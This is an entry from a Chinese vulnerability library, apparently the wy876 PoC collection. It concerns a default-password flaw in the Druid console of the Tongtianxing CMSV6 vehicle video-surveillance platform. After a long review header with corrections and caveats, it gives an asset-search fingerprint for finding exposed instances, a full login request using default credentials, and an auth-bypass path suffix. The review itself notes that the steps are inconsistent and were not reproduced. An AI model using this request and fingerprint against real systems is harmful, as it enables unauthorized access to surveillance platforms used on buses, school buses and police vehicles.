---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "web.body="
category_recommendation: "IOT安全/其他设备"
title: "通天星CMSV6车载视频监控平台druid存在默认口令漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Druidconsoleenabled/exposed; unchangeddeploymentcredentials;sessionunknown"
side_effects: "未执行；本文需注意的操作影响：分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。"
source_status: "unknown"
id: "vw-def3604ab46dfc63aa510982"
entity_id: "ve-def3604ab46dfc63aa510982"
schema_version: "1"
---

## 核对与使用边界

- 分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Druidconsoleenabled/exposed; unchangeddeploymentcredentials;sessionunknown

- **结论使用边界（1）**：文字要求;downloadLogger.action绕鉴权但实际/druid/submitLogin未带suffix，步骤不一致。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：默认口令与外围认证绕过两问题应分开，不能从登录请求确定成功。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（3）**：凭据含尾点需声明字面值，来源样例不保证所有版本默认；无响应/修复。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（4）**：分类应行业平台/嵌入Druid组件，Hunter元数据错。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 druid存在默认口令漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台 druid存在默认口令漏洞。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
`;downloadLogger.action`绕过鉴权

```plain
POST /druid/submitLogin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Connection: close
Cookie: JSESSIONID=4F7**************************F8D

loginUsername=ttx&loginPassword=ttx123456.
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/agnzkrfsf9am4t8p>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
